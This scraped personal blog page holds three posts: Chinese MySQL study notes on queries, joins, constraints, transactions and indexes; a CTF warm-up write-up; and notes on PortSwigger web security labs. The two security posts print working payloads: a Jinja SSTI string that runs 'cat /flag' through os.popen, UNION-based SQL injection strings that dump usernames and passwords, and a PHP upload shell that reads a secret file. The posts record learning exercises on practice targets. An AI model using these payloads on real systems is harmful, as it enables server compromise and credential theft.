-<h3 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h3><p>1.分组函数自动忽略空值(null)，不需要手动的加 where 条件排除空值。<br>select count(*) from emp where xxx;     符合条件的所有记录总数。(一行数据，只要不全为null则count++，当然不存在全为null的数据，有一位不是null则数据有效)<br>select count(comm) from emp;            comm 这个字段中不为空的元素总数。<br>2.分组函数不能直接使用在 where 关键字后面。<br>错误示范： mysql&gt; select ename,sal from emp where sal &gt; avg(sal);<br>原因见分组查询<br>3.所有分组函数可组合使用</p>
-<h2 id="17-分组查询（重点）"><a href="#17-分组查询（重点）" class="headerlink" title="17.分组查询（重点）"></a>17.分组查询（重点）</h2><h3 id="什么是分组"><a href="#什么是分组" class="headerlink" title="什么是分组"></a>什么是分组</h3><p>   在实际的应用中，可能有这样的需求，需要先进行分组，然后对每一组的数据进行操作。</p>
-<h3 id="关键字执行顺序"><a href="#关键字执行顺序" class="headerlink" title="关键字执行顺序"></a>关键字执行顺序</h3><pre><code>1. from
-2. where
-3. group by
-4. select
-5. order by
-</code></pre>
-<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>1.分组函数不能在where后：因为分组函数在使用的时候必须先分组之后才能使用，where执行的时候，还没有分组。所以where后面不能出现分组函数。<br>2.select sum(sal) from emp; 这个没有分组，为啥sum()函数可以用呢？   因为select在group by之后执行。<br>3.在一条select语句当中，如果有group by语句的话，select后面只能跟：参加分组的字段，以及分组函数。其它的一律不能跟。<br>4.可多个字段联合分组</p>
-<h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h4 id="1-group-by"><a href="#1-group-by" class="headerlink" title="1.group by"></a>1.group by</h4><p>   例：select job,deptno,sum(sal) from emp group by job,deptno;</p>
-<h4 id="2-having"><a href="#2-having" class="headerlink" title="2.having"></a>2.having</h4><p>   对分组数据再进行过滤需要使用 having 子句<br>     优先考虑where过滤<br>   例：select job, avg(sal) from emp group by job having avg(sal) &gt;2000;<br>   顺序：根据条件查询数据 分组 采用 having 过滤，取得正确的数据</p>
-<h2 id="18-distinct"><a href="#18-distinct" class="headerlink" title="18.distinct"></a>18.distinct</h2><p>把查询结果去除重复记录<br>distinct只能出现在所有字段的最前方:<br>select ename,distinct job from emp为错误形式<br>允许该形式：<br>count(distinct job) </p>
-<h2 id="19-连接查询"><a href="#19-连接查询" class="headerlink" title="19.连接查询"></a>19.连接查询</h2><p>也可以叫跨表查询，需要关联多个表进行查询</p>
-<h3 id="连接分类"><a href="#连接分类" class="headerlink" title="连接分类"></a>连接分类</h3><p>可分为：<br>        内连接：  （无主次，平等）<br>            等值连接        例：select e.ename,d.dname from emp e join dept d on e.deptno = d.deptno;<br>            非等值连接    例：select e.ename, e.sal, s.grade from emp e join salgrade s on e.sal between s.losal and s.hisal; // 条件不是一个等量关系，称为非等值连接。<br>            自连接（技巧：视为多张表）例：select a.ename as ‘员工名’, b.ename as ‘领导名’ from emp a join emp b on a.mgr = b.empno; //员工的领导编号 = 领导的员工编号<br>        外连接：          （可在join前加outer,如right outer join ）<br>            左外连接（左连接）<br>            右外连接（右连接）right代表什么：表示将join关键字右边的这张表看成主表，主要是为了将<br>                                                                     这张表的数据全部查询出来，捎带着关联查询左边的表。<br>                                                                     在外连接当中，两张表连接，产生了主次关系。<br>        全连接</p>
-<h3 id="SQL92与SQLl99"><a href="#SQL92与SQLl99" class="headerlink" title="SQL92与SQLl99"></a>SQL92与SQLl99</h3><h4 id="SQL92语法："><a href="#SQL92语法：" class="headerlink" title="SQL92语法："></a>SQL92语法：</h4><pre><code>select 
-    e.ename,d.dname
- from
-     emp e, dept d
-where
-    e.deptno = d.deptno;
-sql92的缺点：结构不清晰，表的连接条件，和后期进一步筛选的条件，都放到了where后面。
-</code></pre>
-<h4 id="SQL99语法："><a href="#SQL99语法：" class="headerlink" title="SQL99语法："></a>SQL99语法：</h4><pre><code>     select 
-         ...
-     from
-        a
-    (inner) join    //inner可以省略（带着inner可读性更好！！！一眼就能看出来是内连接）
-        b
-     on
-        a和b的连接条件
-    where
-        筛选条件
-sql99优点：表连接的条件是独立的，连接之后，如果还需要进一步筛选，再往后继续添加where
-</code></pre>
-<h2 id="20-多张表的连接查询"><a href="#20-多张表的连接查询" class="headerlink" title="20.多张表的连接查询"></a>20.多张表的连接查询</h2><p>语法：<br>select<br>    …<br> from<br>    a<br> join<br>    b<br> on<br>    a和b的连接条件<br> join<br>    c<br> on<br>    a和c的连接条件<br> right join<br>    d<br> on<br>    a和d的连接条件<br>   b,c,d并列<br>一条SQL中内连接和外连接可以混合。都可以出现</p>
-<h2 id="21-子查询"><a href="#21-子查询" class="headerlink" title="21.子查询"></a>21.子查询</h2><p>子查询就是嵌套的 select 语句，可以理解为子查询是一张表</p>
-<h3 id="where子查询"><a href="#where子查询" class="headerlink" title="where子查询"></a>where子查询</h3><p>格式：<br>select<br>        ..(select).<br>    from<br>        ..(select).<br>    where<br>        ..(select).<br>例：<br>第一步：查询最低工资是多少<br>select min(sal) from emp;<br>结果实例：<br>            +———-+<br>            | min(sal) |<br>            +———-+<br>            |   800.00 |<br>            +———-+<br>第二步：找出&gt;800的<br>select ename,sal from emp where sal &gt; 800;<br>第三步：合并<br>select ename,sal from emp where sal &gt; (select min(sal) from emp);</p>
-<h3 id="from子查询"><a href="#from子查询" class="headerlink" title="from子查询"></a>from子查询</h3><p>注意：from后面的子查询，可以将子查询的查询结果当做一张临时表。<br>例：找出每个岗位的平均工资的薪资等级。<br>第一步：找出每个岗位的平均工资（按照岗位分组求平均值）<br>        select job,avg(sal) from emp group by job;<br>        +———–+————-+<br>        | job       | avgsal      |<br>        +———–+————-+   t表<br>        | ANALYST   | 3000.000000 |<br>        …<br>        +———–+————-+<br>第二步：克服心理障碍，把以上的查询结果就当做一张真实存在的表t。<br>        select * from salgrade;<br>    +——-+——-+——-+<br>    | GRADE | LOSAL | HISAL |<br>    +——-+——-+——-+   s表<br>    |     1 |   700 |  1200 |<br>    |     2 |  1201 |  1400 |<br>    …<br>    t表和s表进行表连接，条件：t表avg(sal) between s.losal and s.hisal;<br>        select<br>            t.*, s.grade<br>        from<br>            (select job,avg(sal) as avgsal from emp group by job) t<br>        join<br>            salgrade s<br>        on<br>            t.avgsal between s.losal and s.hisal;  // 技巧：avg(sal) as avgsal,否则t.avg(sal)报错</p>
-<h3 id="select子查询（非重点）"><a href="#select子查询（非重点）" class="headerlink" title="select子查询（非重点）"></a>select子查询（非重点）</h3><p>对于select后面的子查询来说，这个子查询只能一次返回1条结果(就是括号里面那个)<br>例：<br> select e.ename,e.deptno,(select d.dname from dept d where e.deptno = d.deptno) as dname from emp e;</p>
-<h2 id="22-union"><a href="#22-union" class="headerlink" title="22.union"></a>22.union</h2><p>union可以减少匹配的次数。在减少匹配次数的情况下，还可以完成两个结果集的拼接。<br>例：<br>select ename,job from emp where job = ‘MANAGER’<br>union<br>select ename,job from emp where job = ‘SALESMAN’;</p>
-<h3 id="注意事项："><a href="#注意事项：" class="headerlink" title="注意事项："></a>注意事项：</h3><p>1.union在进行结果集合并的时候，要求两个结果集的列数相同（查询字段对应个数相同）。<br>2.不同于oracle，mysql允许结果集合并时列和列的数据类型不一致。</p>
-<h2 id="23-limit"><a href="#23-limit" class="headerlink" title="23.limit"></a>23.limit</h2><p>将查询结果集的一部分取出来。通常使用在分页查询当中。分页的作用是为了提高用户的体验。</p>
-<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>完整用法：limit startIndex, length<br>        startIndex是起始下标，length是长度。<br>        起始下标从0开始。<br>缺省用法：limit 5; 这是取前5<br>     limit 1,2; 从第二条（下标为1）开始取两条数据<br>注意：mysql当中limit在order by之后执行</p>
-<h3 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h3><p>每页显示3条记录<br>    第1页：limit 0,3        [0 1 2]<br>    第2页：limit 3,3        [3 4 5]<br>    …<br>每页显示pageSize条记录<br>    第pageNo页：limit (pageNo - 1) * pageSize  , pageSize<br>    public static void main(String[] args){<br>        // 用户提交过来一个页码，以及每页显示的记录条数<br>        int pageNo = 5; //第5页<br>        int pageSize = 10; //每页显示10条</p>
-<pre><code>    int startIndex = (pageNo - 1) * pageSize;
-    String sql = &quot;select ...limit &quot; + startIndex + &quot;, &quot; + pageSize;
-&#125;
-</code></pre>
-<p>记公式：limit (pageNo-1)*pageSize , pageSize</p>
-<h2 id="24-语句总结与运行顺序"><a href="#24-语句总结与运行顺序" class="headerlink" title="24.语句总结与运行顺序"></a>24.语句总结与运行顺序</h2><p>总：select … from … where … group by … having … order by … limit …<br>顺序：1.from 2.where 3.group by 4.having 5.select 6.order by 7.limit..</p>
-<h2 id="25-建表"><a href="#25-建表" class="headerlink" title="25.建表"></a>25.建表</h2><h3 id="格式："><a href="#格式：" class="headerlink" title="格式："></a>格式：</h3><p>create table tableName(<br> columnName dataType(length),<br> ………………..<br> columnName dataType(length)<br>);</p>
-<h3 id="MySQL常用数据类型"><a href="#MySQL常用数据类型" class="headerlink" title="MySQL常用数据类型"></a>MySQL常用数据类型</h3><p>类型<br>Char(长度)                            定长字符串，存储空间大小固定，适合作为主键或外键<br>Varchar(长度)                        变长字符串，存储空间等于实际数据空间<br>double(有效数字位数，小数位)     数值型<br>Float(有效数字位数，小数位)      数值型<br>Int(长度)                          整型<br>bigint(长度)                     长整型<br>Date                               日期型<br>BLOB                             Binary Large OBject（二进制大对象）<br>CLOB                             Character Large OBject（字符大对象）</p>
-<h3 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h3><p>添加修改字段：alter table [table name] add [column name] <a href="length">datatype</a>;<br>            alter table [table name] modify [column name] <a href="length">datatype</a> ;<br>         alter table [table name] drop [column name];<br>表复制：create table … as …<br>删除表：drop table if [table name];// 如果这张表存在的话，删除<br>插入数据：insert into 表名(字段名1,字段名2,字段名3…) values(值1,值2,值3);字段名和值数量数据类型对应，没有给其它字段指定值的话，默认值是NULL。若省略前面的字段名，等于都写上，所以值也要都写上</p>
-<h3 id="插入日期注意格式转换"><a href="#插入日期注意格式转换" class="headerlink" title="插入日期注意格式转换"></a>插入日期注意格式转换</h3><p>str_to_date(‘字符串日期’, ‘日期格式’)：将字符串varchar类型转换成date类型<br>date_format(日期类型数据, ‘日期格式’)：将date类型转换成具有一定格式的varchar字符串类型。<br>命名规范：所有的标识符都是全部小写，单词和单词之间使用下划线进行衔接。<br>mysql默认的日期格式：’%Y-%m-%d’<br>date是短日期：只包括年月日信息。默认：%Y-%m-%d<br>datetime是长日期：包括年月日时分秒信息。默认:%Y-%m-%d %h:%i:%s</p>
-<h2 id="26-表的修改与删除"><a href="#26-表的修改与删除" class="headerlink" title="26.表的修改与删除"></a>26.表的修改与删除</h2><p>修改：update 表名 set 字段名称 1=需要修改的值 1, 字段名称 2=需要修改的值 2 where …<br>删除：Delete from 表名 where … 数据在硬盘上的真实存储空间不会被释放，可恢复<br>      truncate table 表名;  不可恢复，快速</p>
-<h2 id="27-约束（重点）"><a href="#27-约束（重点）" class="headerlink" title="27.约束（重点）"></a>27.约束（重点）</h2><p>目的：创建表的时候，给表中的字段加上一些约束保证表中的数据有效完整</p>
-<h3 id="类型："><a href="#类型：" class="headerlink" title="类型："></a>类型：</h3><p>非空约束：not null<br>唯一性约束: unique<br>主键约束: primary key （简称PK）<br>外键约束：foreign key（简称FK）<br>检查约束：check（mysql不支持，oracle支持）</p>
-<h3 id="非空约束"><a href="#非空约束" class="headerlink" title="非空约束"></a>非空约束</h3><p>非空约束not null约束的字段不能为NULL。<br>例：create table t_vip(<br>        id int,<br>        name varchar(255) not null  // not null只有列级约束，没有表级约束！<br>    );</p>
-<h3 id="唯一性约束"><a href="#唯一性约束" class="headerlink" title="唯一性约束"></a>唯一性约束</h3><p>唯一性约束unique约束的字段不能重复，但是可以为NULL。<br>例：create table t_vip(<br>        id int,<br>        name varchar(255) unique,<br>        email varchar(255)<br>    );</p>
-<h3 id="表级约束"><a href="#表级约束" class="headerlink" title="表级约束"></a>表级约束</h3><p>需要给多个字段联合起来添加某一个约束的时候，需要使用表级约束。<br>例：create table t_vip(<br>                id int,<br>                name varchar(255),<br>                email varchar(255),<br>                unique(name,email)<br>)<br>在MySQL中，unique 和not null联合自动变成主键字段。例：name varchar(255) not null unique</p>
-<h3 id="列级约束"><a href="#列级约束" class="headerlink" title="列级约束"></a>列级约束</h3><p>例：id int primary key</p>
-<h3 id="主键约束（primary-key，简称PK）"><a href="#主键约束（primary-key，简称PK）" class="headerlink" title="主键约束（primary key，简称PK）"></a>主键约束（primary key，简称PK）</h3><p>主键字段：该字段上添加了主键约束，这样的字段叫做：主键字段<br>主键值：主键字段中的每一个值都叫做主键值，一般数字且定长<br>作用：主键值是每一行记录的唯一标识，相当于身份证号，任何一张表都应该有主键，没有主键，表无效<br>复合主键：primary key(id,name)多个字段联合起来做约束（不建议使用）<br>在mysql当中，有一种机制，可以帮助我们自动维护一个主键值<br>create table t_vip(<br>            id int primary key auto_increment, //auto_increment表示自增，从1开始，以1递增！<br>            name varchar(255)<br>        );</p>
-<h3 id="外键约束"><a href="#外键约束" class="headerlink" title="外键约束"></a>外键约束</h3><p>外键主要是维护表之间的关系的，主要是为了保证参照完整性，如果表中的某个字段为外键字段，那么该字段的值必须来源于参照的表的字段<br>存在外键的表就是子表，参照的表就是父表，所以存在一个父子关系，也就是主从关系<br>删除表的顺序：先删子，再删父；<br>创建表的顺序：先创建父，再创建子。<br>删除数据的顺序：先删子，再删父。<br>插入数据的顺序：先插入父，再插入子。<br>子表中的外键引用的父表中的某个字段，被引用的这个字段不一定是主键，但至少具有unique约束。<br>外键值可为null<br>例：constraint [table name] foreign key([column name]) references [table name]([column name])<br>更改删除父表数据，子表也会变动</p>
-<h3 id="约束的更改"><a href="#约束的更改" class="headerlink" title="约束的更改"></a>约束的更改</h3><p>删除：外键：alter table 表名 drop foreign key 外键字段;<br>     主键：alter table 表名 drop primary key;<br>         唯一：alter table 表名 drop index 字段名<br>添加： alter table 表名 add constraint 约束名 约束类型(字段名) [外键的引用]</p>
-<h2 id="28-存储引擎（了解）"><a href="#28-存储引擎（了解）" class="headerlink" title="28.存储引擎（了解）"></a>28.存储引擎（了解）</h2><p>存储引擎是MySQL中特有的一个术语，实际上存储引擎是一个表存储/组织数据的方式。不同的存储引擎，表存储数据的方式不同。<br>在创建表时，可使用 ENGINE 选项为 CREATE TABLE 语句显式指定存储引擎。未指定则默认<br>常用引擎：MyISAM InnoDB MEMORY</p>
-<h2 id="29-事务（重点）"><a href="#29-事务（重点）" class="headerlink" title="29.事务（重点）"></a>29.事务（重点）</h2><p>一个事务其实就是一个完整的业务逻辑。是一个最小的工作单元。不可再分。<br>本质上事务就是批量的DML语句（insert、delete、update 对数据进行更改）同时成功，或者同时失败</p>
-<h3 id="事务工作过程"><a href="#事务工作过程" class="headerlink" title="事务工作过程"></a>事务工作过程</h3><p>InnoDB存储引擎：提供一组用来记录事务性活动的日志文件<br>在事务的执行过程中，每一条DML的操作都会记录到“事务性活动的日志文件”中。在事务的执行过程中，我们可以提交事务，也可以回滚事务。<br>提交事务：清空事务性活动的日志文件，将数据全部彻底持久化到数据库表中。标志着事务的结束。并且是一种全部成功的结束。<br>回滚事务：将之前所有的DML操作全部撤销，并且清空事务性活动的日志文件。标志着事务的结束。并且是一种全部失败的结束。</p>
-<h3 id="事务执行"><a href="#事务执行" class="headerlink" title="事务执行"></a>事务执行</h3><p>开始事务：start transaction（关闭DML自动提交，此句开始保持上一次提交点）;<br>提交事务：commit; 语句<br>回滚事务：rollback; 语句（回滚永远都是只能回滚到上一次的提交点）<br>默认每执行一条DML自动提交</p>
-<h3 id="事务特性"><a href="#事务特性" class="headerlink" title="事务特性"></a>事务特性</h3><p>原子性：说明事务是最小的工作单元。不可再分。<br>一致性：所有事务要求，在同一个事务当中，所有操作必须同时成功，或者同时失败，以保证数据的一致性。<br>隔离性：A事务和B事务之间具有一定的隔离。教室A和教室B之间有一道墙，这道墙就是隔离性。A事务在操作一张表的时候，另一个事务B也操作这张表会那样<br>持久性：事务最终结束的一个保障。事务提交，就相当于将没有保存到硬盘上的数据保存到硬盘上</p>
-<h3 id="事务隔离性"><a href="#事务隔离性" class="headerlink" title="事务隔离性"></a>事务隔离性</h3><p>4个级别<br>读未提交：read uncommitted（最低的隔离级别）事务A可以读取到事务B未提交的数据。<br>读已提交：read committed （数据库隔离级别默认从此开始）事务A只能读取到事务B提交之后的数据。数据真实<br>可重复读：repeatable read （mysql中默认）事务A开启之后，不管是多久，每一次在事务A中读取到的数据都是一致的。即使事务B将数据已经修改，并且提交了，事务A读取到的数据还是没有发生改变<br>序列化/串行化：serializable（最高的隔离级别）事务排队，不能并发（我操作你停） synchronized，线程同步（事务同步）将一个事务与其他事务完全地隔离。效率最低</p>
-<h3 id="一致性问题"><a href="#一致性问题" class="headerlink" title="一致性问题"></a>一致性问题</h3><p>脏读现象：读到脏数据（未提交的数据）<br>不可重复读：事务A开启之后，不管是多久，每一次在事务A中读取到的数据都是一致的。即使事务B将数据已经修改，并且提交了<br>幻像读：读到的数据可能不够绝对真实，即使事务B将数据已经修改，并且提交了，事务A读取到的数据还是没有发生改变</p>
-<h3 id="隔离级别与一致性问题关系"><a href="#隔离级别与一致性问题关系" class="headerlink" title="隔离级别与一致性问题关系"></a>隔离级别与一致性问题关系</h3><p>隔离级别     脏读取     不可重复读        幻像读<br>读未提交     可能          可能            可能<br>读已提交    不可能       可能            可能<br>可重复读     不可能      不可能        对InnoDB不可能<br>序列化       不可能        不可能        不可能</p>
-<h3 id="设置隔离级别"><a href="#设置隔离级别" class="headerlink" title="设置隔离级别"></a>设置隔离级别</h3><p>会话级：mysql&gt; SET TRANSACTION ISOLATION …；<br>            或：<br>       mysql&gt; SET SESSION TRANSACTION ISOLATION LEVEL …；<br>全局级：mysql&gt; SET GLOBAL TRANSACTION ISOLATION LEVEL …；</p>
-<h3 id="查看隔离级别"><a href="#查看隔离级别" class="headerlink" title="查看隔离级别"></a>查看隔离级别</h3><p>mysql&gt; SELECT @@tx_isolation;或：<br>mysql&gt; SELECT @@session.tx_isolation;<br>– 查看全局级的当前隔离级别：<br>mysql&gt; SELECT @@global.tx_isolation;</p>
-<h2 id="30-索引"><a href="#30-索引" class="headerlink" title="30.索引"></a>30.索引</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>索引是在数据库表的字段上添加的，是为了提高查询效率存在的一种机制。索引被用来快速找出在一个列上用一特定值的行。一张表的一个字段可以添加一个索引，当然，多个字段联合起来也可以添加索引。索引相当于一本书的目录，是为了缩小扫描范围而存在的一种机制。<br>MySQL在查询方面主要就是两种方式：第一种方式：全表扫描（无索引时的查找方式，效率较低）；第二种方式：根据索引检索。</p>
-<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在mysql当中索引是一个B-Tree数据结构。<br>遵循左小又大原则存放。采用中序遍历方式遍历取数据。<br>底层是一个自平衡的二叉树<br>注意：1.任何数据库主键自动添加索引，mysql如果有unique约束也会自动创建<br>2.在任何数据库当中，任何一张表的任何一条记录在硬盘存储上都有一个硬盘的物理存储编号<br>3.在mysql当中，索引是一个单独的对象，在mysql当中都是一个树的形式存在。（自平衡二叉树：B-Tree）不同存储引擎形式不同</p>
-<h3 id="应用条件"><a href="#应用条件" class="headerlink" title="应用条件"></a>应用条件</h3><p>1.表中该字段中的数据量庞大<br>2.经常被检索，经常出现在 where 子句中的字段<br>3.经常被 DML 操作的字段不建议添加索引（增删改后要重新排序）<br>4.索引需维护，不随意添加<br>5.唯一性比较弱的字段上添加索引用处不大。</p>
-<h3 id="索引应用"><a href="#索引应用" class="headerlink" title="索引应用"></a>索引应用</h3><p>建立：create index 索引名 on 表名(字段名);<br>     alter table 表名 add unique index 索引名 (列名);<br>删除：DROP INDEX 索引名 ON 表名<br>         ALTER TABLE 表名 DROP INDEX 索引名<br>查看索引：show index from 表名;<br>通过扫描次数判断是否使用索引</p>
-<h3 id="explain语句"><a href="#explain语句" class="headerlink" title="explain语句"></a>explain语句</h3><p>语法：explain select …<br>用来查看SQL语句执行效果</p>
-<h3 id="索引失效"><a href="#索引失效" class="headerlink" title="索引失效"></a>索引失效</h3><p>1.模糊匹配当中以“%”开头 如：select * from emp where ename like ‘%T’;<br>2.使用or的时候其中一边有一个字段没有索引（union不会失效）<br>3.使用复合索引（两个字段，或者更多的字段联合起来添加一个索引）的时候，没有使用左侧的列查找<br>4.在where当中索引列参加了运算<br>5.在where当中索引列使用了函数<br>…<br>(没有直接匹配结果则失效？)</p>
-<h3 id="索引分类"><a href="#索引分类" class="headerlink" title="索引分类"></a>索引分类</h3><p>单一索引：一个字段上添加索引。<br>复合索引：两个字段或者更多的字段上添加索引。<br>主键索引：主键上添加索引。<br>唯一性索引：具有unique约束的字段上添加索引。<br>…..</p>
-<h2 id="31-视图"><a href="#31-视图" class="headerlink" title="31.视图"></a>31.视图</h2><p>视图（虚拟表）：站在不同的角度去看待同一份数据，是一种根据查询（也就是 SELECT 表达式）定义的数据库对象，用于获取想要看到和使用的局部数据。用来提高检索效率，隐藏表的实现细节（面向视图检索）</p>
-<h3 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h3><p>创建：create view 视图名 as select …;（mysql 不支持子查询创建视图）<br>删除：drop view (if exists) 视图名 ;<br>修改：alter view 视图名 as select …;</p>
-<h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>可以面向视图对象进行增删改查（看作一张表），对视图对象的增删改查，会导致原表被操作！（视图的特点：通过对视图的操作，会影响到原表数据。）方便，简化开发，利于维护</p>
-<h2 id="32-DBA"><a href="#32-DBA" class="headerlink" title="32.DBA"></a>32.DBA</h2><p>重点数据导入导出（数据备份）</p>
-<h3 id="导入"><a href="#导入" class="headerlink" title="导入"></a>导入</h3><p>登录 MYSQL 数据库管理系统之后执行：source D:\ bjpowernode.sql</p>
-<h3 id="导出"><a href="#导出" class="headerlink" title="导出"></a>导出</h3><p>导出整个数据库：在 windows 的 dos 命令窗口中执行：mysqldump bjpowernode&gt;D:\bjpowernode.sql -uroot -p123<br>导出指定库下的指定表：在 windows 的 dos 命令窗口中执行：mysqldump bjpowernode emp&gt; D:\ bjpowernode.sql -uroot –p123</p>
-<h2 id="33-数据库设计三范式"><a href="#33-数据库设计三范式" class="headerlink" title="33.数据库设计三范式"></a>33.数据库设计三范式</h2><p>第一范式：有主键，具有原子性，字段不可分割<br>第二范式：完全依赖，没有部分依赖<br>第三范式：没有传递依赖</p>
-<h3 id="表设计总结"><a href="#表设计总结" class="headerlink" title="表设计总结"></a>表设计总结</h3><p>一对多：一对多，两张表，多的表加外键<br>多对多：多对多，三张表，关系表两个外键<br>一对一：一张表字段太多，太庞大就拆分表，外键唯一</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2023/07/13/week1/" data-id="clk6k5tln00092gudcbm848y3" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-warmup" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2023/04/28/warmup/" class="article-date">
-  <time datetime="2023-04-28T08:08:35.000Z" itemprop="datePublished">2023-04-28</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/04/28/warmup/">2023/04/18：FCTF2023：warmup&amp;正式比赛</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>无所谓会不会，主要是图一乐<br>又菜又爱玩才能进步</p>
-<h4 id="warm-up"><a href="#warm-up" class="headerlink" title="warm up"></a>warm up</h4><h5 id="viewsource"><a href="#viewsource" class="headerlink" title="viewsource"></a>viewsource</h5><p>没啥好说的，F12</p>
-<h5 id="filechecker"><a href="#filechecker" class="headerlink" title="filechecker"></a>filechecker</h5><p>先再次复习下再继续</p>
-<img src="/2023/04/28/warmup/az.png" class="">
-<p>啊这（<br>找了网上的payload，这题先随便传个图片上去，然后把那些二进制的内容删掉改成</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="comment">#! &#123;&#123;lipsum.__globals__.os.popen(&quot;cat /flag&quot;).read()&#125;&#125;</span></span><br></pre></td></tr></table></figure>
-<p>这题应该是借文件上传利用SSTI获得flag，写的时候一直想怎么注入cat flag命令结果是这样的方式，多刷吧还是没办法马上反应过来(想着怎么利用bin那句命令结果忘了之前的SSIT了emm)<br>FCTF{realflag_5vycRgpY1Ekhrdk5wLcJoynj3QOH2JUoUfbCG0he}</p>
-<h5 id="javadeserialize"><a href="#javadeserialize" class="headerlink" title="javadeserialize"></a>javadeserialize</h5><p>emm这个折腾的有点久有点问题<br>——————————————————————————<br>捋一捋IDEA的使用，好像哪里不大对<br>在IDEA的使用上折腾有点久，最开始时一直报错，至少现在能打开了能运行了（ 还在调试题目的源文件，复制黏贴时文件有点问题，复制的文件不是“可执行类”，没法达到想要的效果，单纯的复制文件不会被真正导入，再慢慢找问题。可能忘记改pom?<br>——————————————————————————<br>最开始用IDEA时手忙脚乱，似乎把题目文件结构破坏了，尝试了很多次，初次IDEA不熟悉它的工作方式犯了不少低级错误，甚至忘了Maven,因为添加目录为库时没操作好让程序报错，还以为又是自己把文件损坏了（</p>
-<h4 id="正式赛"><a href="#正式赛" class="headerlink" title="正式赛"></a>正式赛</h4>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2023/04/28/warmup/" data-id="clk6k5tln00082gud2xyt54g8" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-aaaa" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2023/04/27/aaaa/" class="article-date">
-  <time datetime="2023-04-27T12:05:50.000Z" itemprop="datePublished">2023-04-27</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/04/27/aaaa/">2023/04/15：burplabs从0开始</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>这里的题目看起来更像真实的场景<br>可惜有点卡，下面的解答视频有一种没带眼镜的美<br>有完整教程，很行</p>
-<h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2><h3 id="apprentice"><a href="#apprentice" class="headerlink" title="apprentice"></a>apprentice</h3><p>开网页的时间比写还久（恼）</p>
-<h4 id="1"><a href="#1" class="headerlink" title="1"></a>1</h4><p>第一题为get注入 单引号闭合然后1=1就完事了<br>有点卡反应比较慢</p>
-<img src="/2023/04/27/aaaa/lab1.png" class="">
-<h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4><p>简单的万能密码，啥过滤也没有</p>
-<img src="/2023/04/27/aaaa/lab2.png" class="">
-<h3 id="practitoner"><a href="#practitoner" class="headerlink" title="practitoner"></a>practitoner</h3><h4 id="3"><a href="#3" class="headerlink" title="3"></a>3</h4><p>联合查询第一步，column的数量</p>
-<img src="/2023/04/27/aaaa/lab3.png" class="">
-<p>一直用null测出数量</p>
-<h4 id="4"><a href="#4" class="headerlink" title="4"></a>4</h4><p>union select，找到指定column，把上一题的一个null替换即可</p>
-<h4 id="4-5"><a href="#4-5" class="headerlink" title="4.5"></a>4.5</h4><p>burp内有教程，但是全英文属实有点难受<br>但想到之前sql注入总是因为语句不合适失败还是先硬着头皮边看边写吧</p>
-<h4 id="5"><a href="#5" class="headerlink" title="5"></a>5</h4><p>get传参的联合注入，直接在地址栏注就行：’+UNION+SELECT+username,+password+FROM+users–<br>回显在下面文章标题（？）那里，感觉很奇怪好像也很合理</p>
-<h4 id="6"><a href="#6" class="headerlink" title="6"></a>6</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="string">&#x27; UNION SELECT username || &#x27;</span>~<span class="string">&#x27; || password FROM users--</span></span><br></pre></td></tr></table></figure>
-<p>emm大概是一种联合查询技巧以便更好的得到所需数据吧</p>
-<h4 id="7"><a href="#7" class="headerlink" title="7"></a>7</h4><h2 id="File-upload"><a href="#File-upload" class="headerlink" title="File upload"></a>File upload</h2><p>文件上传复习</p>
-<h3 id="apprentice-1"><a href="#apprentice-1" class="headerlink" title="apprentice"></a>apprentice</h3><h4 id="1-1"><a href="#1-1" class="headerlink" title="1"></a>1</h4><p>用php文件，写上</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ &lt;?php </span><br><span class="line"> <span class="built_in">echo</span> file_get_contents(<span class="string">&#x27;/home/carlos/secret&#x27;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>把这个文件在上传头像的地方上传，然后右键在新网页打开头像即可</p>
-<p>这个是github上找的方法比官方给的省事<br>可能因为网络问题用官方改数据包的方式可能失败</p>
-<h4 id="2-1"><a href="#2-1" class="headerlink" title="2"></a>2</h4><p>将Content-Type改为image/jpeg或png即可</p>
-<h4 id="3-1"><a href="#3-1" class="headerlink" title="3"></a>3</h4><p>emm burp好像遇到了点问题似乎改不了包 折腾太久了先放着<br>这一题的防护比上次更严格，要先将php传入file文件夹里才能绕过检测</p>
